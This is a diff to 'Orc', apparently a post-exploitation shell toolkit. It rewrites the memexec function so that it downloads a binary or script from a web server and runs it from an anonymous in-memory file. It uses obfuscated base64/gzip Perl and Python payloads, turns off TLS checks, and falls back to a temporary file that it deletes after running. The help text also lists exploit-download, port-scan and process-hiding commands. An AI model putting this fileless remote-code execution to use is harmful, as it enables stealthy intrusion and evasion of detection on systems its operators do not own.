@@ -21,19 +21,18 @@ orc_existsProg () {
     echo 'Error: missing program name to check' >&2
     return 1;
   fi
-  hash "$@" > /dev/null 2> /dev/null
+  # The hash tool works on bash, dash, ash but on ksh
+  # the type tool is needed. On ksh "hash xyz" returns
+  # 0 also if the program xyz does not exists.
+  type "$@" > /dev/null 2> /dev/null
   }
 
 
-orc_loadURL () {
-  # Loads from an URL via curl, wget or perl.
-  # Argument: The URL to download, https is supported.
-  # Output to stdout: The content of the URL document.
+orc_exportProxySettings () {
+  # Export http and https proxy settings in some formats.
+  # Arguments: None
   # Global: http(s)_proxy variables will be used.
-  if [ $# -ne 1 ]; then
-    echo 'Error: argument must be one URL to load' >&2
-    return 1
-  fi
+  #
   # A proxy could be set via environment variables to the tools.
   # But some tools in some versions needs lower case and some
   # needs upper case variable names. To increase portability
@@ -58,6 +57,19 @@ orc_loadURL () {
   elif [ -n "$HTTPS_PROXY" ]; then
     https_proxy=$HTTPS_PROXY
   fi
+}
+
+
+orc_loadURL () {
+  # Loads from an URL via curl, wget or perl.
+  # Argument: The URL to download, https is supported.
+  # Output to stdout: The content of the URL document.
+  # Global: http(s)_proxy variables will be used.
+  if [ $# -ne 1 ]; then
+    echo 'Error: argument must be one URL to load' >&2
+    return 1
+  fi
+  orc_exportProxySettings
   if orc_existsProg curl; then
     curl --silent --location --insecure -- "$1"
   elif orc_existsProg wget; then
@@ -247,16 +259,6 @@ orc_archive () {
 # in the helper functions section.
 #
 
-memfda=$(cat << EOF
-IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2Ugd2FybmluZ3M7CnVzZSBzdHJpY3Q7CgokfD0xOwoKbXkgJG5hbWUgPSAiIjsKbXkgJGZkID0gc3lzY2FsbCgzMTksICRuYW1lLCAxKTsKaWYgKC0xID09ICRmZCkgewoJZGllOwp9CgpwcmludCAiZmQgJGZkXG4iOwoKb3BlbiAobXkgJEZILCAnPiY9Jy4kZmQpIG9yIGRpZTsKc2VsZWN0ICgoc2VsZWN0KCRGSCksICR8PTEpIFswXSk7CgpwcmludCAkRkggcGFjayBxL0gqLywgcS8K
-EOF
-)
-
-memfdb=$(cat << EOF
-cHJpbnQgImRvbmVcbiI7CmV4ZWN7Ii9wcm9jLyQkL2ZkLyRmZCJ9ICJ0ZXN0IiwgIiIsICIiIG9yIGRpZTsK
-EOF
-)
-
 
 alias 'echo'='/bin/echo'
 
@@ -406,6 +408,42 @@ orc_ourpts() {
   if [ "/dev/pts/$mypts" = "$mytty" ]; then
     echo "$mypts"
   fi
+}
+
+
+orc_isMinimalOsVersion() {
+  # Checks the OS name and version.
+  # Arguments: OS name (e.g. Linux)
+  #            First part of the version number
+  #            Secoend part of the version numer
+  # Return: 0 if OS name is equal and version is equal or greater.
+  #         1 if OS name is not equal
+  #         2 if OS name is equal but version is less.
+  local first rest
+  if [ $# -ne 3 ]; then
+    echo "Error: missing arguments: name, version1, version2" >&2
+    return 9
+  fi
+  # use the short options -s and -n because not all uname tools
+  # support the long option names, e.g. busybox.
+  if [ "$1" != "$(uname -s)" ]; then
+    return 1
+  fi
+  rest=$(uname -r)
+  first=${rest%%.*}
+  if [ "$first" -gt "$2" ]; then
+    return 0;
+  elif [ "$first" -lt "$2" ]; then
+    return 2;
+  fi
+  # first part of the version number is equal
+  rest=${rest#*.}
+  first=${rest%%.*}
+  if [ "$first" -lt "$3" ]; then
+    return 2
+  fi
+  # second part of the version number is greater or equal
+  return 0
 }
 
 
@@ -614,23 +652,98 @@ qsu() {
   rm "$ORC_ECHO_FILE"
 }
 
+
 memexec() {
-  # Execute a binary in-memory from webserver.
+  # Execute a binary program or a script file in-memory from webserver.
+  # Stores the downloaded file in an anonymous file in the
+  # /proc/self process memory.
+  # If this is not possible the file is stored in the $HOME
+  # directory of orc, which is typical a tmpfs.
   # Argument: URL of the binary, http or https is supported.
-  if [ $# -ne 1 ]; then
+  #           other arguments are passed thru to the program/script
+  # Global:   http_proxy and https_proxy variables could be used
+  #           to defined a proxy for the download.
+  local url interpreter
+  if [ $# -lt 1 ]; then
     echo 'Error: memexec needs URL as argument' >&2
     return 1
   fi
-  if ! orc_existsProg perl; then
-    echo 'Error: missing perl, can not execute in memory' >&2
-    return 1
+  # first argument is the URL to load
+  url="$1"
+  shift
+  if ! orc_existsProg base64; then
+    echo 'Warning: need base64, go into fallback mode' >&2
+    interpreter='fallback'
+  elif ! orc_existsProg gzip; then
+    echo 'Warning: need gzip, go inti fallback mode' >&2
+    interpreter='fallback'
+  elif ! orc_isMinimalOsVersion Linux 3 17; then
+    echo 'Warning: need Linux >= 3.17, go in fallback mode' >&2
+    interpreter='fallback'
+  elif orc_existsProg python3; then
+    interpreter='python3'
+  elif orc_existsProg python2; then
+    interpreter='python2'
+  elif orc_existsProg python; then
+    # Python version 2 interpreter is often named simply "python"
+    interpreter='python'
+  elif orc_existsProg perl; then
+    interpreter='perl'
+  else
+    echo 'Warinng: need perl or python, go in fallback mode' >&2
+    interpreter='fallback'
   fi
-  memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
-  finalmem=$(echo "$memfda" | base64 -d)
-  finalmem=${finalmem}$(echo "$memfile/ or die;")
-  finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
-  echo "$finalmem" | perl
+  orc_exportProxySettings
+  if [ "$interpreter" = 'fallback' ]; then
+    # Can not load the program/script into anonymous file.
+    # As fallback load the file into the orc $HOME, this
+    # should be a tmpfs.
+    orc_loadURL "$url" > "$HOME/.mem"
+    chmod +x "$HOME/.mem"
+    "$HOME/.mem" "$@"
+    rm "$HOME/.mem"
+  elif [ "$interpreter" = 'perl' ]; then
+    # decode the Perl script and run the script
+    ( base64 -d |
+      gzip -d |
+      perl - "$url" '-' "$@"
+    ) << ====end
+H4sIANs4vlwAA41TS4/aMBC+51cMKVKCFMRzIwrNqlUPvXBYLX0ckdeZgNXEztrOAgL62+tHttvV
+qtCDI3nme2UygaBRCMsfd/P5ilV1ifC4i7sNgQ1qe5QWEnsLh/oseME2i6A6QFcdFCVlySVk0B8t
+AlbEXd8/Ekm3nFR4huwXDPazdJ1O+yXjzX7Qg2MAr8mT0Xs4B1iqfyqwySy9wL9Jr/HJJf/RZDq8
+IhATWZ3MwYcTsZ102ruQZ3ZzRa4WO5RxTU81TafuUeIlwfRqPlWbwsk9L2ebzrwUul7OEMKvW6bA
+6jGNVDcSwdy50KCauhZSY564dha9MY9Co2Z2pX+rVLkWtVbxE0pWHNZbobSFQHYLwwRWq+W67VQi
+99We36NGliaY2rJCg5A+UsWUYnxjbDdNhVwnoLcI3+6XoefUUmz+g2RhklRgg7RMnwnC9lrkVsYP
+KH6ZVOKBCYx6frEtzq5572VslPBIA5VINALhgkPBSkPpduxQrLgrGq+ByUEH3e6gyAdGqbWmbg5/
+/rDYTSJpWa2tw3QyGA+Hb5xLQXJnCYUUFSiUZsAJKE10o8AyM8e3aUSNHNz7bhOIPswl2UWtVTsW
++XDQqEwe8z65x9m6qyYw9nGeUTbR6zxuXxzVJVJsw4lbJUewEWgpzNIZYScVvetEgI/Q8JrQnxCR
+sc3jwF7YfAqNFRxD5E/hGaJ+/zlwAh8/3X/5/vca4x4pHF337JejBQXn4DckTWOa3wQAAA==
+====end
+  else
+    # else must be: "$interpeter" = 'pythonX'
+    # decode the Python script and run the script
+    # The Python scrips runs with Python version 3 and 2
+    ( base64 -d |
+      gzip -d |
+      PYTHONHTTPSVERIFY=0 "$interpreter" - "$url" '-' "$@"
+    ) << ====end
+H4sIAEhQv1wAA31Uy27bMBC8+yu2yUESaih27LiuUffS5lAg6KHozQgCWlrJbCRSJanYRtF/75LU
+My7Cg2UO9zG7syQvK6kMJOZcoZ5wv5Pdv6pgJpOqbPf6rCdGnTcToJUpWUKtioLvY4W/a9QGGjtC
+ZYVigqcEKwPfHHqvlFQXrrevfSjHU8KK4knU5R6Vhi38cU7Bab16Wi2DDSzmH6ce4ov1ygJ3qxZg
+zmK+WM4ahKnSWqzv+j3uxwhTycEH7rBKHlFVicVWszHmLS/RAke4riisRZbrIeK9l+vJ376TPOs6
+HVP5BsswgndbCB64qE+BN7JLMa4RftTC8BJdP8NA15XtnwYpijM4jynsawOZrEUKAby/DB5dpC1Z
+cuACKa+QJKOA1zLEz3jWYfQ2l1SidgEaUmA7yw0mplY4ptIl9Fz6dIoEf518d+n22JZQoAjJPmYq
+f4ngEyzeplhyrbnIiVlelyiM3tjJA0atqpTMFStBsBKhrGmc9wg5f0EReJLW0JFzyXZzz8GZD+Bb
+D3cJhmeLjT/MUkL9rYu/fH14CL9LgZHVx5YdDroxhSCYwrxTzHpuYf52kQkTToZEITNIxUlxLmWt
+IeM0pT6WBYlEcENlJzdWG21UKHWco6l4SsIQFNxkaXeWpY1WPBfMKboFy9uBR24OYC9waAMT6+M+
+iIDRWNZmQLZ5J7btdQ/pG3XHxwPxg5+qxt7Frn2dZWgHo/Gn94al4Xy2XN99WEUjU2qRrdx7jKO4
+SOT5/D+Hvig7CnaofIgIPg+73a5hD7zhbrZplG8XVR4fFY1/G6rVcJyr2+1mj/bmhVKlYXAdRNTE
+a9vDkc18YPPO2dBvz4/0ay6505cUhCurX3BF3/iX5KRPO5hO4KtmHLDQOAqDJ0xeGjF3dsan8EgO
+vXf7ut+7D6dspDb2j3yluDChA7o7TlG5CWma/wHwSxYceQYAAA==
+====end
+  fi;
 }
+
 
 getpty() {
 SHELL=$(command -v sh)
@@ -931,7 +1044,7 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 [*]      getdbus - list all dbus services
 [*]   getexploit - download and run linux-exploit-suggester
 [*]      memexec - execute a binary in-memory from a webserver
-[*]              - memexec [full URI] (x64 only)
+[*]              - memexec [full URI] [program arguments]
 [*]     portscan - run a portscan against common ports - portscan [host]
 [*]     prochide - run a program with $0 changed to the longest entry in ps
 [*]              - prochide [program + args]
